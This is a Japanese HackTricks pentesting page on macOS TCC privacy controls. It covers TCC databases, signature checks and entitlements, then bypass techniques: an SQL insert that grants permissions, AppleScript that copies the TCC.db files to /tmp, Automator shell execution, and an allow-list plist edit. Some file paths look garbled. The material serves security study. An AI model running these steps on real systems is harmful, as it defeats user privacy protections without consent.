# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、PRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に参加してください。**

</details>

## **基本情報**

**TCC（透明性、同意、および制御）**は、macOSの機構であり、通常はプライバシーの観点から**アプリケーションの特定の機能へのアクセスを制限および制御**します。これには、位置情報サービス、連絡先、写真、マイクロフォン、カメラ、アクセシビリティ、フルディスクアクセスなどが含まれます。

ユーザーの視点からは、TCCが動作しているのは、**TCCによって保護された機能へのアクセスをアプリケーションが要求したとき**です。これが発生すると、**ユーザーにはアクセスを許可するかどうかを尋ねるダイアログが表示**されます。

また、ユーザーが**ファイルにアクセスを許可する**こともできます。たとえば、ユーザーが**ファイルをプログラムにドラッグ＆ドロップする**場合（もちろん、プログラムはそれにアクセスできる必要があります）。

![TCCプロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`にある**デーモン**によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`で構成されています（`com.apple.tccd.system`というマッハサービスを登録）。

ログインしているユーザーごとに定義された**ユーザーモードのtccd**が`/System/Library/LaunchAgents/com.apple.tccd.plist`に実行され、マッハサービス`com.apple.tccd`と`com.apple.usernotifications.delegate.com.apple.tccd`を登録しています。

ここでは、システムとユーザーとして実行されているtccdを確認できます：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
アプリケーションの**親から継承される**権限と、**Bundle ID**と**Developer ID**に基づいて**追跡**される権限があります。

### TCCデータベース

許可/拒否は、いくつかのTCCデータベースに保存されます：

* システム全体のデータベースは、**`/Library/Application Support/com.apple.TCC/TCC.db`**にあります。
* このデータベースは**SIPで保護**されているため、SIPバイパスのみが書き込むことができます。
* ユーザーごとの設定のためのユーザーTCCデータベースは、**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**にあります。
* このデータベースは、FDAなどの高いTCC特権を持つプロセスのみが書き込むことができます（ただし、SIPで保護されていません）。

{% hint style="warning" %}
前述のデータベースは、読み取りアクセスのためにも**TCCで保護**されています。そのため、通常のユーザーTCCデータベースをTCC特権プロセスから読み取ることはできません。

ただし、FDAや**`kTCCServiceEndpointSecurityClient`**のようなこれらの高い特権を持つプロセスは、ユーザーのTCCデータベースに書き込むことができます。
{% endhint %}

* **3番目の**TCCデータベースは、**`/var/db/locationd/clients.plist`**にあり、**位置情報サービスにアクセスできるクライアント**を示します。
* SIPで保護された**`/Users/carlospolop/Downloads/REG.db`**（TCCでの読み取りアクセスも保護されています）には、すべての有効なTCCデータベースの**場所**が含まれています。
* SIPで保護された**`/Users/carlospolop/Downloads/MDMOverrides.plist`**（TCCでの読み取りアクセスも保護されています）には、さらなるTCCの許可が含まれています。
* 誰でも読み取ることができますが、SIPで保護された**`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**は、TCCの例外を必要とするアプリケーションの許可リストです。&#x20;

{% hint style="success" %}
**iOS**のTCCデータベースは、**`/private/var/mobile/Library/TCC/TCC.db`**にあります。
{% endhint %}

{% hint style="info" %}
**通知センターUI**は、**システムのTCCデータベース**を変更することができます：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

ただし、ユーザーは**`tccutil`**コマンドラインユーティリティを使用して、ルールを**削除またはクエリ**することができます。
{% endhint %}

#### データベースのクエリ

{% tabs %}
{% tab title="ユーザーDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="システムDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
両方のデータベースをチェックすることで、アプリが許可された権限、禁止された権限、または持っていない権限（要求される）を確認できます。
{% endhint %}

- **`service`** は TCC の **権限** 文字列表現です
- **`client`** は権限を持つ **バンドルID** または **バイナリへのパス** です
- **`client_type`** はバンドル識別子（0）か絶対パス（1）かを示します

<details>

<summary>絶対パスの場合の実行方法</summary>

単に **`launctl load you_bin.plist`** を実行します。以下のような plist ファイルを使用します:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`**の値は、denied(0)、unknown(1)、allowed(2)、またはlimited(3)のいずれかです。
* **`auth_reason`**の値は、以下のいずれかを取ります: Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
* **csreq**フィールドは、実行するバイナリを検証し、TCCの許可を付与する方法を示すために存在しています:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* 他のフィールドに関する詳細については、[このブログ記事](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)をチェックしてください。

また、`システム環境設定 --> セキュリティとプライバシー --> プライバシー --> ファイルとフォルダー`で、アプリにすでに与えられている許可を確認することもできます。

{% hint style="success" %}
ユーザーは、**`tccutil`** を使用してルールを削除またはクエリすることができます。&#x20;
{% endhint %}

#### TCCの許可をリセットする
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC シグネチャのチェック

TCCの**データベース**は、アプリケーションの**Bundle ID**を保存するだけでなく、**許可を使用するために要求するアプリ**が正しいものであることを確認するための**シグネチャに関する情報**も保存します。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
したがって、同じ名前とバンドルIDを使用する他のアプリは、他のアプリに付与された許可をアクセスできなくなります。
{% endhint %}

### エンタイトルメントとTCCの許可

アプリは、リソースへのアクセスを要求し、アクセスが許可されただけでなく、関連するエンタイトルメントを持つ必要があります。\
たとえば、**Telegram**は、カメラへのアクセスを要求するためのエンタイトルメント`com.apple.security.device.camera`を持っています。このエンタイトルメントを持たないアプリは、カメラにアクセスできません（ユーザーには許可の要求もされません）。

ただし、アプリが`~/Desktop`、`~/Downloads`、`~/Documents`などの特定のユーザーフォルダにアクセスするためには、特定のエンタイトルメントは必要ありません。システムはアクセスを透過的に処理し、必要に応じてユーザーにプロンプトを表示します。

Appleのアプリはプロンプトを生成しません。エンタイトルメントリストに事前に付与された権限が含まれているため、ポップアップは表示されず、TCCデータベースにも表示されません。例えば：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
これにより、カレンダーがユーザーにリマインダー、カレンダー、アドレス帳へのアクセスを求めることを防ぎます。

{% hint style="success" %}
公式のエンタイトルメントに関するドキュメント以外にも、[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)で非公式のエンタイトルメントに関する興味深い情報を見つけることができます。
{% endhint %}

いくつかのTCCの許可は、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotosなどです... すべてを定義する公開リストはありませんが、この[既知のリスト](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)を確認できます。

### 機密保護されていない場所

* $HOME（それ自体）
* $HOME/.ssh、$HOME/.awsなど
* /tmp

### ユーザーの意図 / com.apple.macl

前述のように、ファイルをアプリにドラッグ＆ドロップすることで、そのアプリにファイルへのアクセスを許可することができます。このアクセスはTCCデータベースには特定されませんが、ファイルの**拡張属性**として保存されます。この属性には、許可されたアプリのUUIDが保存されます。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
興味深いことに、**`com.apple.macl`**属性はtccdではなく**Sandbox**によって管理されています。

また、コンピュータ内のアプリのUUIDを許可するファイルを別のコンピュータに移動すると、同じアプリでも異なるUIDを持つため、そのアプリにアクセス権が付与されません。
{% endhint %}

拡張属性`com.apple.macl`は、他の拡張属性とは異なり、**SIPによって保護**されているため、**クリアすることはできません**。ただし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**圧縮**し、**削除**してから**解凍**することで無効化することが可能です。

## TCCの特権昇格とバイパス

### TCCへの挿入

ある時点でTCCデータベースに対して書き込みアクセス権を取得できた場合、以下のようなエントリを追加するために次のようなものを使用することができます（コメントを削除してください）：

<details>

<summary>TCCへの挿入の例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### FDAへの自動化

Automation権限のTCC名は：**`kTCCServiceAppleEvents`**です。\
この特定のTCC権限は、TCCデータベース内で管理できる**アプリケーション**を示します（つまり、すべてを管理するわけではありません）。

**Finder**は、**常にFDAを持っている**アプリケーションです（UIに表示されない場合でも）、そのため、それに対して**Automation**権限があれば、その権限を悪用して**いくつかのアクションを実行**することができます。\
この場合、アプリケーションには、**`com.apple.Finder`**に対して**`kTCCServiceAppleEvents`**の許可が必要です。

{% tabs %}
{% tab title="ユーザーのTCC.dbを盗む" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="システムのTCC.dbを盗む" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

これを悪用することで、**独自のユーザーTCCデータベースを作成**することができます。

{% hint style="warning" %}
この権限を使用すると、**FinderにTCC制限されたフォルダへのアクセスを要求**し、ファイルを取得することができますが、私の知る限りでは、Finderに任意のコードを実行させることはできません。

したがって、FDAの全機能を悪用することはできません。
{% endhint %}

これは、Finderに対してAutomation権限を取得するためのTCCプロンプトです：

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator**アプリがTCC権限**`kTCCServiceAppleEvents`**を持っているため、Finderのような任意のアプリを**制御**することができます。したがって、Automatorを制御する権限があれば、以下のコードのように**Finder**を制御することもできます：
{% endhint %}

<details>

<summary>Automator内でシェルを取得する</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

同じことが**Script Editorアプリ**でも起こります。Finderを制御することはできますが、AppleScriptを使用してスクリプトを実行することはできません。

### **Endpoint Security ClientからFDAへ**

**`kTCCServiceEndpointSecurityClient`**を持っている場合、FDAを持っています。終わり。

### System Policy SysAdmin FileからFDAへ

**`kTCCServiceSystemPolicySysAdminFiles`**は、ユーザーのホームフォルダを変更するユーザーの**`NFSHomeDirectory`**属性を変更することができ、それによりTCCをバイパスすることができます。

### User TCC DBからFDAへ

ユーザーのTCCデータベースに**書き込み権限**を取得すると、自分自身に**`FDA`**権限を付与することはできません。システムデータベースに存在する権限のみがそれを付与できます。

しかし、自分自身に**`Finderへの自動化権限`**を与えることができ、前述の技術を悪用してFDAにエスカレーションすることができます\*。

### **FDAからTCC権限へ**

TCCのフルディスクアクセスのTCC名は**`kTCCServiceSystemPolicyAllFiles`**です。

これは本当の特権昇格ではないと思いますが、念のため役立つかもしれません。FDAを制御するプログラムがある場合、ユーザーのTCCデータベースを変更し、任意のアクセス権を自分自身に付与することができます。これは、FDAの権限を失った場合の持続性の技術として役立つ場合があります。

### **SIPバイパスからTCCバイパスへ**

システムのTCCデータベースはSIPによって保護されているため、SIPによって制限されたファイルを変更できる権限を持つプロセスのみがそれを変更できます。したがって、攻撃者がSIPバイパスを見つけると、次のことができます。

* TCCデータベースの保護を**解除**し、自分自身にすべてのTCC権限を与えることができます。たとえば、次のファイルを悪用することができます。
* TCCシステムデータベース
* REG.db
* MDMOverrides.plist

ただし、この**SIPバイパスを使用してTCCをバイパス**する別のオプションがあります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`というファイルは、TCCの例外を必要とするアプリケーションの許可リストです。したがって、攻撃者がこのファイルからSIP保護を**解除**し、自分自身の**アプリケーション**を追加できれば、そのアプリケーションはTCCをバイパスできます。\
たとえば、ターミナルを追加する場合:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

このファイルは、macOSのTCC（トランスペアレントなコンセント制御）フレームワークの一部であり、アプリケーションがユーザーのプライバシーにアクセスするために必要な権限を持っているかどうかを制御します。

このプロパティリストファイルには、許可されたアプリケーションのリストが含まれており、ユーザーが明示的に許可したアプリケーションのみがプライバシーにアクセスできるようになります。

このファイルを編集することで、特定のアプリケーションに対してTCCフレームワークの制限を追加または削除することができます。ただし、注意が必要であり、不正な変更はセキュリティ上のリスクを引き起こす可能性があります。

このファイルは、システムのセキュリティを向上させるために使用されることがありますが、慎重に操作する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC バイパス

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考文献

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
